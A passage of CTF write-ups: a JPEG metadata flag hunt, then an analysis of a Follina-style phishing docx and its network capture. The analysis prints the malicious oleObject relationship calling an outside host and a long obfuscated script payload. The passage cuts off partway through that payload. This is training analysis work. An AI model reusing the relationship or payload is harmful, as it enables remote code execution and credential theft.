[{"uri":"https://n1trate.github.io/writeups/nsec-2022-warmup/kitty/","title":"Kitty!","tags":[],"description":"","content":"Challenge statement:\nExamine the kitty.jpeg file to find the flag. 🔗https://drive.google.com/file/d/1XWD2aurnHEVzwcd3hub8vOW4AlbZKJDy/view?usp=sharing The kitty.jpeg looks like a very valid picture.\nSince it is the first challenge of the warmup, we can start with a simple approach.\n$ strings kitty.jpeg | grep -i nsec nsec2022{kitcam2022} Well\u0026hellip; here\u0026rsquo;s our flag! That went faster than expected. I was going to try with other words like ctf and flag, but the competition name is a great start.\nAnother way to find it was to do the same using exiftool:\n$ exiftool kitty.jpeg | grep -i nsec Camera Model Name : nsec2022{kitcam2022} "},{"uri":"https://n1trate.github.io/writeups/htb-business-ctf-2022-dirty-money/linas-invitation/","title":"Lina&#39;s Invitation","tags":[],"description":"","content":"Challenge statement:\nA CEO of a startup company reported that he could no longer access his Password Vault. It seems the password has been changed, but he states not to have done so. He reports receiving a birthday invitation to a Paintball party the last week. A few days later, his Italian friend told him that her email had been hacked and never sent out those birthday invites. He fears his lost password might have something to do with that birthday invite. Their SOC team confirmed their assumptions by admitting that this document escaped their attention and did not trigger any alert. Now they want us, ENIGMA, to analyze the provided network capture they took on the day and the document sent via his friends' email.\nAfter downloading the challenge files, we can find a pcap and a docx.\nI decided to take a look at the word document first. Since it\u0026rsquo;s a docx, we can extract the bundle by opening the document as a zip archive.\n. ├── [Content_Types].xml ├── docProps │ ├── app.xml │ └── core.xml ├── _rels └── word ├── document.xml ├── fontTable.xml ├── _rels │ └── document.xml.rels ├── settings.xml ├── styles.xml ├── theme │ └── theme1.xml └── webSettings.xml In the word/_rels/document.xml.rels file we can find some External Dependencies, the base for the newer Follina attack vector.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34; standalone=\u0026#34;yes\u0026#34;?\u0026gt; \u0026lt;Relationships xmlns=\u0026#34;http://schemas.openxmlformats.org/package/2006/relationships\u0026#34;\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId8\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\u0026#34; Target=\u0026#34;footer1.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId13\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme\u0026#34; Target=\u0026#34;theme/theme1.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId3\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/webSettings\u0026#34; Target=\u0026#34;webSettings.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId7\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\u0026#34; Target=\u0026#34;header2.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId12\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/fontTable\u0026#34; Target=\u0026#34;fontTable.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId2\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings\u0026#34; Target=\u0026#34;settings.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId1\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles\u0026#34; Target=\u0026#34;styles.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId6\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\u0026#34; Target=\u0026#34;header1.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId11\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\u0026#34; Target=\u0026#34;footer3.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId5\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/endnotes\u0026#34; Target=\u0026#34;endnotes.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId10\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/header\u0026#34; Target=\u0026#34;header3.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId4\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/footnotes\u0026#34; Target=\u0026#34;footnotes.xml\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId1337\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\u0026#34; Target=\u0026#34;mhtml:http://windowsliveupdater.com:80/windowsupdate.html!x-usc:http://windowsliveupdater.com:80/windowsupdate.html\u0026#34; TargetMode=\u0026#34;External\u0026#34;/\u0026gt;\u0026lt;Relationship Id=\u0026#34;rId9\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/footer\u0026#34; Target=\u0026#34;footer2.xml\u0026#34;/\u0026gt;\u0026lt;/Relationships\u0026gt; \u0026lt;!--Relationship Id=\u0026#34;rOlsk\u0026#34; Type=http://windowsliveupdater.com?Pt2=RjBsbGluYV9oNHNf--\u0026gt; That second last Relationship is the one that would trigger the download and execution of the html file:\n\u0026lt;Relationship Id=\u0026#34;rId1337\u0026#34; Type=\u0026#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject\u0026#34; Target=\u0026#34;mhtml:http://windowsliveupdater.com:80/windowsupdate.html!x-usc:http://windowsliveupdater.com:80/windowsupdate.html\u0026#34; TargetMode=\u0026#34;External\u0026#34;/\u0026gt; That website http://windowsliveupdater.com is a redirector to Rick Roll. So that is fun! Nothing much to see here, let\u0026rsquo;s move on to the pcap.\nWe can find the query to the windowsliveupdater.com website in the third stream:\nWe can see the commented out document.write() call.\n\u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt; \u0026lt;!-- document.write(decodeURIComponent(\u0026#39;%3C%21%64%6F%63%74%79%70%65%20%68%74%6D%6C%3E%0A%3C%68%74%6D%6C%20%6C%61%6E%67%3D%22%65%6E%22%3E%0A%3C%68%65%61%64%3E%0A%3C%74%69%74%6C%65%3E%0A%47%6F%6F%64%20%74%68%69%6E%67%20%77%65%20%64%69%73%61%62%6C%65%64%20%6D%61%63%72%6F%73%0A%3C%2F%74%69%74%6C%65%3E%0A%3C%2F%68%65%61%64%3E%0A%3C%62%6F%64%79%3E%0A%3C%70%3E%0A%49%43%41%67%49%45%70%6C%64%6D%64%79%4C%55%6C%79%5A%57%39%69%5A%6E%49%67%49%6C%73%71%58%53%42%51%5A%58%4A%75%5A%33%5A%68%64%43%42%52%59%6D%70%68%65%57%4A%75%63%53%42%51%5A%57%35%78%65%58%49%67%5A%6E%42%6C%64%6D%4E%6E%49%47%68%6D%64%6D%46%30%49%43%52%6F%5A%58%6B%69%43%69%41%67%49%43%41%6B%55%57%4A%71%59%58%6C%69%62%6E%46%51%5A%57%35%78%65%58%49%67%50%53%64%62%52%6D%78%6D%5A%33%4A%36%4C%6B%46%79%5A%79%35%47%63%6D%56%70%64%6E%42%79%51%32%4A%32%59%57%64%61%62%6D%46%75%64%48%4A%6C%58%54%6F%36%52%6E%4A%6C%61%58%4A%6C%55%48%4A%6C%5A%33%5A%7A%64%6E%42%75%5A%33%4A%4A%62%6E%6C%32%63%57%35%6E%64%6D%4A%68%55%47%35%35%65%57%39%75%63%48%67%67%50%53%42%37%4A%47%64%6C%61%48%4A%39%4F%79%52%77%65%58%5A%79%59%57%63%67%50%53%42%42%63%6D%6F%74%51%6D%39%33%63%6E%42%6E%49%45%46%79%5A%79%35%4B%63%6D%39%51%65%58%5A%79%59%57%63%37%4A%48%42%35%64%6E%4A%68%5A%79%35%44%5A%57%4A%72%62%44%31%62%51%58%4A%6E%4C%6B%70%79%62%30%56%79%5A%47%68%79%5A%6D%64%64%4F%6A%70%55%63%6D%64%47%62%47%5A%6E%63%6E%70%4B%63%6D%39%44%5A%57%4A%72%62%43%67%70%4F%79%52%77%65%58%5A%79%59%57%63%75%51%32%56%69%61%32%77%75%55%47%56%79%63%58%4A%68%5A%33%5A%75%65%57%59%39%57%30%46%79%5A%79%35%51%5A%58%4A%78%63%6D%46%6E%64%6D%35%35%55%47%35%77%64%58%4A%64%4F%6A%70%52%63%6E%4E%75%61%48%6C%6E%55%47%56%79%63%58%4A%68%5A%33%5A%75%65%57%59%37%56%6D%46%70%59%6E%68%79%4C%56%4A%72%59%32%56%79%5A%6D%5A%32%59%6D%45%67%4A%48%42%35%64%6E%4A%68%5A%79%35%78%59%6D%70%68%65%57%4A%75%63%57%5A%6E%5A%58%5A%68%64%43%67%6E%4A%79%63%72%4A%47%68%6C%65%53%73%6E%4A%79%63%70%4F%79%63%30%0A%0A%49%43%41%67%49%48%73%4B%49%43%41%67%49%43%41%67%49%43%42%4B%5A%58%5A%6E%63%69%31%4A%63%6D%56%76%59%6D%5A%79%49%43%4A%62%4B%6C%30%67%57%57%4A%69%65%47%59%67%65%58%5A%34%63%69%42%71%63%69%64%6C%63%69%41%7A%4D%6D%39%32%5A%79%77%67%61%47%5A%32%59%58%51%67%5A%6D%78%6D%61%6D%4A%71%4E%6A%51%67%59%32%4A%71%63%6D%56%6D%64%58%4A%35%65%53%35%79%61%33%49%69%43%69%41%67%49%43%41%67%49%43%41%67%4A%45%4E%69%61%6E%4A%6C%5A%6E%56%79%65%58%6C%53%61%33%49%39%4A%48%4A%68%61%54%70%71%64%6D%46%78%64%6D%55%72%4A%31%78%6D%62%47%5A%71%59%6D%6F%32%4E%46%78%4B%64%6D%46%78%59%6D%70%6D%51%32%4A%71%63%6D%56%47%64%58%4A%35%65%56%78%70%4D%53%34%77%58%47%4E%69%61%6E%4A%6C%5A%6E%56%79%65%58%6B%75%63%6D%74%79%4A%77%6F%67%49%43%41%67%66%54%73%4B%49%43%41%67%49%41%41%67%0A%3C%2F%70%3E%0A%3C%70%3E%0A%63%32%68%68%63%47%64%32%59%6D%45%67%56%6D%46%70%59%6E%68%79%4C%56%70%79%5A%32%35%6D%59%33%6C%69%64%6D%64%44%62%6D%78%35%59%6D%35%78%49%41%70%37%43%6A%77%6A%43%69%35%47%54%45%46%43%51%30%5A%57%52%67%70%59%64%6E%42%34%49%47%4A%7A%63%79%42%75%49%46%70%79%5A%32%35%6D%59%33%6C%69%64%6D%63%67%51%32%35%73%65%57%4A%75%63%53%42%6F%5A%6E%5A%68%64%43%42%6E%64%58%49%67%63%6D%74%6A%65%57%4A%32%5A%79%39%36%61%48%6C%6E%64%69%39%6D%63%47%56%32%59%32%63%76%61%6E%4A%76%58%33%46%79%65%58%5A%70%63%6D%56%73%49%48%70%69%63%57%68%35%63%67%70%4F%61%47%64%31%59%6D%55%36%49%46%64%75%5A%58%4A%78%49%46%56%75%64%6E%52%31%5A%79%41%6F%51%48%64%75%5A%58%4A%78%64%57%35%32%64%48%56%6E%4B%51%70%5A%64%6E%42%79%59%57%5A%79%4F%69%42%61%56%6B%63%4B%52%58%4A%6B%61%48%5A%6C%63%6E%45%67%55%58%4A%6A%63%6D%46%78%63%6D%46%77%64%6E%4A%6D%4F%69%42%42%59%6D%46%79%43%6B%4A%6A%5A%33%5A%69%59%57%35%35%49%46%46%79%59%33%4A%68%63%58%4A%68%63%48%5A%79%5A%6A%6F%67%51%57%4A%68%63%67%6F%67%43%69%35%52%55%6B%5A%51%52%56%5A%44%52%31%5A%43%51%51%70%47%59%32%35%71%59%57%59%67%62%69%42%68%63%6D%6F%73%49%48%56%32%63%58%46%79%59%53%42%44%59%6D%70%79%5A%55%5A%31%63%6E%6C%35%49%47%70%32%59%58%46%69%61%69%42%6E%64%57%35%6E%49%48%46%69%61%6D%46%35%59%6D%35%78%5A%69%42%75%59%58%45%67%63%6D%74%79%63%47%68%6E%63%6D%59%67%62%69%42%61%63%6D%64%75%5A%6D%4E%35%59%6E%5A%6E%49%47%4E%75%62%48%6C%69%62%6E%45%67%63%32%56%69%65%69%42%75%49%47%5A%6A%63%6E%42%32%63%33%5A%79%63%53%42%49%52%56%6B%75%43%67%70%48%64%58%5A%6D%49%47%56%79%65%58%5A%79%5A%69%42%69%59%53%42%6E%64%58%49%67%63%6D%74%6A%65%57%4A%32%5A%79%39%36%61%48%6C%6E%64%69%39%6D%63%47%56%32%59%32%64%6D%4C%32%70%79%62%31%39%78%63%6E%6C%32%61%58%4A%6C%62%43%42%36%63%6D%64%75%5A%6D%4E%35%59%6E%5A%6E%49%48%70%69%63%57%68%35%63%69%34%67%52%33%56%79%49%47%70%79%62%31%39%78%63%6E%6C%32%61%58%4A%6C%62%43%42%36%59%6E%46%6F%65%58%49%67%64%48%4A%68%63%6D%56%75%5A%33%4A%6D%49%47%34%67%5A%6E%42%6C%64%6D%4E%6E%49%48%4E%69%5A%51%70%75%49%48%52%32%61%58%4A%68%49%47%4E%75%62%48%6C%69%62%6E%45%67%62%6D%46%78%49%47%64%31%63%6D%45%67%63%33%5A%6C%63%6D%59%67%61%47%4D%67%62%69%42%71%63%6D%39%6D%63%6D%56%70%63%6D%55%67%5A%32%49%67%64%57%4A%6D%5A%79%42%6D%62%6E%5A%78%49%47%5A%77%5A%58%5A%6A%5A%79%34%67%56%6E%4D%67%5A%33%56%79%49%47%4E%75%62%48%6C%69%62%6E%45%67%64%6D%59%67%62%69%42%6C%63%6D%6C%79%5A%57%5A%79%49%47%5A%31%63%6E%6C%35%4C%43%42%32%5A%79%42%71%64%6E%6C%35%49%47%35%35%5A%6D%49%67%64%57%35%68%63%58%6C%79%43%6D%5A%6E%62%6D%56%6E%64%6D%46%30%49%47%68%6A%49%47%64%31%63%69%42%35%64%6D%5A%6E%63%6D%46%79%5A%53%42%7A%59%6D%55%67%5A%33%56%75%5A%79%42%6A%62%6D%78%35%59%6D%35%78%4C%69%41%4B%43%6B%35%68%49%48%4A%72%62%6E%70%6A%65%58%49%67%5A%58%41%67%63%33%5A%35%63%69%42%32%5A%69%42%76%63%6E%6C%69%61%69%41%6F%59%6D%55%67%62%47%4A%6F%49%48%42%75%59%53%42%33%61%47%5A%6E%49%47%64%73%59%33%49%67%5A%33%56%79%49%48%42%69%65%6E%70%75%59%58%46%6D%49%48%70%75%59%57%68%75%65%58%6C%73%4B%53%34%67%56%6D%63%67%63%57%4A%79%5A%69%42%6E%64%58%49%67%63%32%4A%35%65%57%4A%71%64%6D%46%30%4F%67%6F%4B%4B%69%42%47%63%6D%64%6D%49%47%64%31%63%69%42%78%59%6D%70%68%65%57%4A%75%63%53%42%77%5A%57%35%78%65%58%49%67%5A%32%49%67%59%32%4A%6C%5A%79%41%34%4E%44%51%7A%49%43%68%47%52%55%6C%44%51%6B%56%48%4B%53%42%69%59%53%42%75%65%58%6B%67%56%6B%4E%6D%49%43%68%47%52%55%6C%56%51%6B%5A%48%4B%51%6F%71%49%45%5A%79%5A%32%59%67%5A%33%56%79%49%47%5A%77%5A%58%5A%6A%5A%79%42%6E%62%6D%56%30%63%6D%63%67%5A%32%49%67%51%32%4A%71%63%6D%56%47%64%58%4A%35%65%53%41%6F%5A%6E%4A%6E%49%47%64%75%5A%58%52%79%5A%79%41%79%4B%51%6F%71%49%45%5A%79%5A%32%59%67%5A%33%56%79%49%47%4E%75%62%48%6C%69%62%6E%45%67%62%33%4A%32%59%58%51%67%5A%6E%4A%6C%61%58%4A%78%49%47%64%69%49%47%70%32%59%58%46%69%61%6D%59%76%65%6E%4A%6E%63%6D%56%6A%5A%58%4A%6E%63%6D%55%76%5A%58%4A%70%63%6D%56%6D%63%6C%39%31%5A%32%64%6A%5A%67%6F%71%49%45%5A%79%5A%32%59%67%5A%33%56%79%49%47%4E%75%62%48%6C%69%62%6E%45%67%5A%32%49%67%65%58%5A%6D%5A%33%4A%68%49%47%4A%68%49%47%4E%69%5A%57%63%67%4E%44%51%7A%49%43%68%5A%51%30%4A%46%52%79%6B%67%59%6D%45%67%62%6E%6C%35%49%46%5A%44%5A%69%41%6F%57%56%56%43%52%6B%63%70%0A%0A%49%43%41%67%49%48%5A%7A%49%43%67%6B%52%6E%56%79%65%58%6C%77%59%6E%46%79%4E%6A%51%75%57%58%4A%68%64%47%64%31%49%43%31%79%5A%43%41%77%4B%51%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%42%37%43%69%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%42%48%64%57%56%69%61%69%41%6E%51%57%49%67%5A%6E%56%79%65%58%6C%77%59%6E%46%79%49%47%70%75%5A%69%42%6A%65%57%35%77%63%6E%45%67%64%6D%45%67%5A%33%56%79%49%43%52%47%64%58%4A%35%65%58%42%69%63%58%49%32%4E%43%42%70%62%6D%56%32%62%6D%39%35%63%69%45%6E%43%69%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%42%6C%63%6D%64%6F%5A%57%45%4B%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%67%66%51%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%4B%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%67%4A%45%5A%31%63%6E%6C%35%63%47%4A%78%63%69%41%39%49%43%52%47%64%58%4A%35%65%58%42%69%63%58%49%32%4E%41%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%42%4B%5A%58%5A%6E%63%69%31%4A%63%6D%56%76%59%6D%5A%79%49%43%64%49%5A%6E%5A%68%64%43%41%32%4E%43%31%76%64%6D%63%67%5A%6E%56%79%65%58%6C%77%59%6E%46%79%4C%69%63%4B%49%43%41%67%49%43%41%67%49%43%42%39%43%69%41%67%49%43%41%4B%49%43%41%67%49%43%41%67%49%43%41%6A%49%45%35%35%65%57%4A%77%62%6D%64%79%49%45%56%4B%53%79%42%36%63%6E%70%69%5A%57%77%67%63%32%4A%6C%49%47%64%31%63%69%42%6D%64%58%4A%35%65%58%42%69%63%58%49%4B%49%43%41%67%49%43%41%67%49%43%41%6B%54%32%35%6D%63%6B%35%78%63%57%56%79%5A%6D%59%67%50%53%41%6B%53%58%5A%6C%5A%32%68%75%65%55%35%35%65%57%4A%77%4C%6C%5A%68%61%57%4A%34%63%69%68%62%56%6D%46%6E%51%32%64%6C%58%54%6F%36%54%58%4A%6C%59%69%77%67%4A%45%5A%31%63%6E%6C%35%63%47%4A%78%63%69%35%5A%63%6D%46%30%5A%33%55%67%4B%79%41%78%4C%43%41%77%61%7A%4D%77%4D%44%41%73%49%44%42%72%4E%44%41%70%49%43%4D%67%4B%45%56%79%5A%6E%4A%6C%61%58%4A%38%55%47%4A%36%65%6E%5A%6E%4C%43%42%46%53%6B%73%70%43%69%41%67%49%43%41%67%49%43%41%67%64%6E%4D%67%4B%43%45%6B%54%32%35%6D%63%6B%35%78%63%57%56%79%5A%6D%59%70%43%69%41%67%49%43%41%67%49%43%41%67%65%77%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%42%48%64%57%56%69%61%69%41%69%53%47%46%75%62%33%6C%79%49%47%64%69%49%47%35%35%65%57%4A%77%62%6D%64%79%49%47%5A%31%63%6E%6C%35%63%47%4A%78%63%69%42%36%63%6E%70%69%5A%57%77%67%64%6D%45%67%51%31%5A%52%4F%69%41%6B%51%32%56%69%63%48%4A%6D%5A%6C%5A%52%49%67%6F%67%49%43%41%67%49%43%41%67%49%48%30%4B%49%43%41%67%49%43%41%67%49%43%41%4B%49%43%41%67%49%43%41%67%49%43%42%4B%5A%58%5A%6E%63%69%31%4A%63%6D%56%76%59%6D%5A%79%49%43%4A%47%64%58%4A%35%65%58%42%69%63%58%49%67%65%6E%4A%36%59%6D%56%73%49%47%56%79%5A%6E%4A%6C%61%58%4A%78%49%47%35%6E%49%44%42%72%4A%43%67%6B%54%32%35%6D%63%6B%35%78%63%57%56%79%5A%6D%59%75%52%32%4A%47%5A%32%56%32%59%58%51%6F%49%6B%73%6B%4B%46%74%57%59%57%64%44%5A%32%56%64%4F%6A%70%47%64%6D%31%79%4B%6A%49%70%49%69%6B%70%49%67%6F%4B%49%43%41%67%49%43%41%67%49%43%41%6A%49%46%42%69%59%32%77%67%5A%6E%56%79%65%58%6C%77%59%6E%46%79%49%47%64%69%49%45%56%4B%53%79%42%76%61%48%4E%7A%63%6D%55%4B%49%43%41%67%49%43%41%67%49%43%42%62%52%6D%78%6D%5A%33%4A%36%4C%6B%56%6F%59%57%64%32%65%6E%49%75%56%6D%46%6E%63%6D%56%69%59%30%5A%79%5A%57%6C%32%63%48%4A%6D%4C%6C%70%75%5A%57%5A%31%62%6E%6C%64%4F%6A%70%51%59%6D%4E%73%4B%43%52%47%64%58%4A%35%65%58%42%69%63%58%49%73%49%44%41%73%49%43%52%50%62%6D%5A%79%54%6E%46%78%5A%58%4A%6D%5A%69%77%67%4A%45%5A%31%63%6E%6C%35%63%47%4A%78%63%69%35%5A%63%6D%46%30%5A%33%55%70%43%69%41%67%49%43%41%67%49%43%41%67%43%69%41%67%49%43%41%67%49%43%41%67%49%79%42%55%63%6D%63%67%62%6E%46%78%5A%58%4A%6D%5A%69%42%69%63%79%42%53%61%33%5A%6E%52%33%56%6C%63%6D%35%78%49%48%4E%6F%59%58%42%6E%64%6D%4A%68%43%69%41%67%49%43%41%67%49%43%41%67%4A%46%4A%72%64%6D%64%48%64%57%56%79%62%6E%46%4F%63%58%46%6C%49%44%30%67%56%48%4A%6E%4C%55%4E%6C%59%6E%42%4F%63%58%46%6C%63%6D%5A%6D%49%48%68%79%5A%57%46%79%65%54%4D%79%4C%6E%46%35%65%53%42%53%61%33%5A%6E%52%33%56%6C%63%6D%35%78%43%69%41%67%49%43%41%67%49%43%41%67%43%69%41%67%49%43%41%67%49%43%41%67%64%6E%4D%67%4B%43%52%44%59%6D%70%79%5A%55%5A%31%63%6E%6C%35%4D%7A%4A%76%64%6D%63%70%43%69%41%67%49%43%41%67%49%43%41%67%65%77%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%6B%55%47%35%35%65%55%5A%6E%61%47%38%67%50%53%42%53%65%6E%5A%6E%4C%56%42%75%65%58%6C%48%64%57%56%79%62%6E%46%47%5A%32%68%76%49%43%52%50%62%6D%5A%79%54%6E%46%78%5A%58%4A%6D%5A%69%41%6B%55%6D%74%32%5A%30%64%31%5A%58%4A%75%63%55%35%78%63%57%55%67%4D%7A%49%4B%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%67%43%69%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%45%70%6C%64%6D%64%79%4C%55%6C%79%5A%57%39%69%5A%6E%49%67%4A%31%4A%36%64%6D%64%6E%64%6D%46%30%49%44%4D%79%4C%57%39%32%5A%79%42%75%5A%6D%5A%79%65%6D%39%35%62%43%42%77%62%6E%6C%35%49%47%5A%6E%61%47%38%75%4A%77%6F%67%49%43%41%67%49%43%41%67%49%48%30%4B%49%43%41%67%49%43%41%67%49%43%42%79%65%57%5A%79%43%69%41%67%49%43%41%67%49%43%41%67%65%77%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%6B%55%47%35%35%65%55%5A%6E%61%47%38%67%50%53%42%53%65%6E%5A%6E%4C%56%42%75%65%58%6C%48%64%57%56%79%62%6E%46%47%5A%32%68%76%49%43%52%50%62%6D%5A%79%54%6E%46%78%5A%58%4A%6D%5A%69%41%6B%55%6D%74%32%5A%30%64%31%5A%58%4A%75%63%55%35%78%63%57%55%67%4E%6A%51%4B%49%43%41%67%49%43%41%67%49%43%41%67%49%43%41%67%43%69%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%45%70%6C%64%6D%64%79%4C%55%6C%79%5A%57%39%69%5A%6E%49%67%4A%31%4A%36%64%6D%64%6E%64%6D%46%30%49%44%59%30%4C%57%39%32%5A%79%42%75%5A%6D%5A%79%65%6D%39%35%62%43%42%77%62%6E%6C%35%49%47%5A%6E%61%47%38%75%4A%77%6F%67%49%43%41%67%49%43%41%67%49%48%30%4B%43%69%41%67%49%43%41%67%49%43%41%67%49%79%42%4F%65%58%6C%69%63%47%35%6E%63%69%42%46%53%6B%73%67%65%6E%4A%36%59%6D%56%73%49%48%4E%69%5A%53%42%6E%64%58%49%67%5A%33%56%6C%63%6D%35%78%49%48%42%75%65%58%6B%67%5A%6D%64%6F%62%77%6F%67%49%43%41%67%49%43%41%67%49%43%52%51%62%6E%6C%35%52%6D%64%6F%62%30%35%78%63%57%56%79%5A%6D%59%67%50%53%41%6B%53%58%5A%6C%5A%32%68%75%65%55%35%35%65%57%4A%77%4C%6C%5A%68%61%57%4A%34%63%69%68%62%56%6D%46%6E%51%32%64%6C%58%54%6F%36%54%58%4A%6C%59%69%77%67%4A%46%42%75%65%58%6C%47%5A%32%68%76%4C%6C%6C%79%59%58%52%6E%64%53%41%72%49%44%45%73%49%44%42%72%4D%7A%41%77%4D%43%77%67%4D%47%73%30%4D%43%6B%67%49%79%41%6F%52%58%4A%6D%63%6D%56%70%63%6E%78%51%59%6E%70%36%64%6D%63%73%49%45%56%4B%53%79%6B%4B%49%43%41%67%49%43%41%67%49%43%42%32%63%79%41%6F%49%53%52%51%62%6E%6C%35%52%6D%64%6F%62%30%35%78%63%57%56%79%5A%6D%59%70%43%69%41%67%49%43%41%67%49%43%41%67%65%77%6F%67%49%43%41%67%49%43%41%67%49%43%41%67%49%43%42%48%64%57%56%69%61%69%41%69%53%47%46%75%62%33%6C%79%49%47%64%69%49%47%35%35%65%57%4A%77%62%6D%64%79%49%47%64%31%5A%58%4A%75%63%53%42%77%62%6E%6C%35%49%47%5A%6E%61%47%38%75%49%67%6F%67%49%43%41%67%49%43%41%67%49%48%30%4B%49%43%41%67%49%43%41%67%49%43%41%4B%49%43%41%67%49%43%41%67%49%43%42%4B%5A%58%5A%6E%63%69%31%4A%63%6D%56%76%59%6D%5A%79%49%43%4A%48%64%57%56%79%62%6E%45%67%63%47%35%35%65%53%42%6D%5A%32%68%76%49%48%70%79%65%6D%4A%6C%62%43%42%6C%63%6D%5A%79%5A%57%6C%79%63%53%42%75%5A%79%41%77%61%79%51%6F%4A%46%42%75%65%58%6C%47%5A%32%68%76%54%6E%46%78%5A%58%4A%6D%5A%69%35%48%59%6B%5A%6E%5A%58%5A%68%64%43%67%69%53%79%51%6F%57%31%5A%68%5A%30%4E%6E%5A%56%30%36%4F%6B%5A%32%62%58%49%71%4D%69%6B%69%4B%53%6B%69%43%67%6F%67%49%43%41%67%49%43%41%67%49%43%4D%67%55%47%4A%6A%62%43%42%77%62%6E%6C%35%49%47%5A%6E%61%47%38%67%5A%32%49%67%52%55%70%4C%49%47%39%6F%63%33%4E%79%5A%51%6F%67%49%43%41%67%49%43%41%67%49%46%74%47%62%47%5A%6E%63%6E%6F%75%52%57%68%68%5A%33%5A%36%63%69%35%57%59%57%64%79%5A%57%4A%6A%52%6E%4A%6C%61%58%5A%77%63%6D%59%75%57%6D%35%6C%5A%6E%56%75%65%56%30%36%4F%6C%42%69%59%32%77%6F%4A%46%42%75%65%58%6C%47%5A%32%68%76%4C%43%41%77%4C%43%41%6B%55%47%35%35%65%55%5A%6E%61%47%39%4F%63%58%46%6C%63%6D%5A%6D%4C%43%41%6B%55%47%35%35%65%55%5A%6E%61%47%38%75%57%58%4A%68%64%47%64%31%4B%51%6F%4B%49%43%41%67%49%43%41%67%49%43%41%6A%49%46%6C%75%61%47%46%77%64%53%42%6D%64%58%4A%35%65%58%42%69%63%58%49%67%64%6D%45%67%64%6D%63%6E%5A%69%42%69%61%6D%45%67%5A%33%56%6C%63%6D%35%78%43%69%41%67%49%43%41%67%49%43%41%67%4A%45%64%31%5A%58%4A%75%63%56%56%75%59%58%46%35%63%69%41%39%49%43%52%51%5A%58%4A%75%5A%33%4A%48%64%57%56%79%62%6E%45%75%56%6D%46%70%59%6E%68%79%4B%46%74%57%59%57%64%44%5A%32%56%64%4F%6A%70%4E%63%6D%56%69%4C%43%41%77%4C%43%41%6B%55%47%35%35%65%55%5A%6E%61%47%39%4F%63%58%46%6C%63%6D%5A%6D%4C%43%41%6B%54%32%35%6D%63%6B%35%78%63%57%56%79%5A%6D%59%73%49%44%41%73%49%46%74%57%59%57%64%44%5A%32%56%64%4F%6A%70%4E%63%6D%56%69%4B%51%6F%67%49%43%41%67%49%43%41%67%49%48%5A%7A%49%43%67%68%4A%45%64%31%5A%58%4A%75%63%56%56%75%59%58%46%35%63%69%6B%4B%49%43%41%67%49%43%41%67%49%43%42%37%43%69%41%67%49%43%41%67%49%43%41%67%49%43%41%67%49%45%64%31%5A%57%4A%71%49%43%4A%49%59%57%35%76%65%58%49%67%5A%32%49%67%65%57%35%6F%59%58%42%31%49%47%64%31%5A%58%4A%75%63%53%34%69%43%69%41%67%49%43%41%67%49%43%41%67%66%53%41%67%0A%3C%2F%70%3E%0A%3C%70%3E%0A%43%69%35%44%54%6B%56%4F%57%6C%4A%48%55%6B%55%67%61%47%56%35%43%6B%64%31%64%6D%59%67%64%6D%59%67%5A%33%56%79%49%45%68%46%57%53%42%7A%59%6D%55%67%5A%33%56%79%49%48%46%69%61%6D%46%35%59%6D%35%78%49%48%42%6C%62%6E%46%35%63%69%77%67%62%32%77%67%63%58%4A%7A%62%6D%68%35%5A%79%42%32%5A%79%42%71%64%6E%6C%35%49%47%39%79%49%47%5A%69%65%6E%4A%6E%64%58%5A%68%64%43%41%4B%65%58%5A%34%63%69%41%69%64%57%64%6E%59%32%59%36%4C%79%39%79%61%58%5A%35%4C%6E%4A%72%62%6E%70%6A%65%58%49%75%63%47%4A%36%4C%31%74%46%62%6D%46%78%59%6E